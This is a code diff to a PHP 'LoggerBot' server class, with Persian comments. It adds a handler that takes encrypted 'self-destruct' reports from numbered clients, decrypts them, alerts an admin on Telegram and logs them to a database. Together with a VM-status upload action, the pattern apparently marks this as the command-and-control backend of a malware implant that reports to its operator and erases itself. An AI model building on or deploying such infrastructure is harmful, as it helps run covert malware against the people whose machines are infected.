@@ -215,13 +215,73 @@ class LoggerBot {
             case 'upload_vm_status':
                 $response = $this->handleUploadVMStatus($data);
                 break;
+            case 'report_self_destruct':
+                $response = $this->handleSelfDestructReport($data);
+                break;
             default:
                 $response = ['error' => 'Unknown action'];
                 break;
         }
-        
+
         $this->logWebhook("Client request response for action: $action, client_id: $clientId, response: " . json_encode($response));
         echo json_encode($response);
+    }
+
+    private function handleSelfDestructReport($data) {
+        try {
+            $this->logWebhook("Self-destruct report: " . json_encode($data));
+
+            $clientId = $data['client_id'] ?? null;
+            if (!$clientId) {
+                $this->logError("Self-destruct report failed: Missing client_id");
+                http_response_code(400);
+                return ['error' => 'Missing client_id'];
+            }
+
+            $report = '';
+            if (isset($data['report']) && !empty($data['report'])) {
+                $this->logWebhook("Received self-destruct report for client_id: $clientId, data: " . substr($data['report'], 0, 50) . "...");
+                $report = $this->decrypt($data['report']);
+                if ($report === '') {
+                    $this->logError("Self-destruct report decryption failed or empty for client_id: $clientId");
+                } else {
+                    $jsonCheck = json_decode($report, true);
+                    if (json_last_error() !== JSON_ERROR_NONE) {
+                        $this->logError("Self-destruct report is not valid JSON for client_id: $clientId, data: " . substr($report, 0, 50) . "...");
+                        $report = '';
+                    } else {
+                        $this->logWebhook("Decrypted self-destruct report for client_id: $clientId, length: " . strlen($report));
+                    }
+                }
+            } else {
+                $this->logWebhook("No self-destruct report provided for client_id: $clientId");
+            }
+
+            // اطلاع‌رسانی به ادمین تلگرام
+            if ($report) {
+                $reportData = json_decode($report, true);
+                $message = "🚨 Self-destruct initiated for client $clientId!\nDetails: " . json_encode($reportData, JSON_PRETTY_PRINT);
+                $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
+            }
+
+            // لاگ در دیتابیس
+            try {
+                $stmt = $this->pdo->prepare(
+                    "INSERT INTO client_logs (client_id, log_type, message, created_at) 
+                    VALUES (?, 'self_destruct', ?, NOW())"
+                );
+                $stmt->execute([$clientId, $report]);
+                $this->logWebhook("Logged self-destruct report for client_id: $clientId");
+            } catch (PDOException $e) {
+                $this->logError("Failed to log self-destruct report for client_id: $clientId, error: " . $e->getMessage());
+            }
+
+            return ['status' => 'success'];
+        } catch (Exception $e) {
+            $this->logError("Self-destruct report failed for client_id: $clientId, error: " . $e->getMessage());
+            http_response_code(500);
+            return ['error' => 'Report failed: ' . $e->getMessage()];
+        }
     }
 
     private function handleUploadVMStatus($data) {
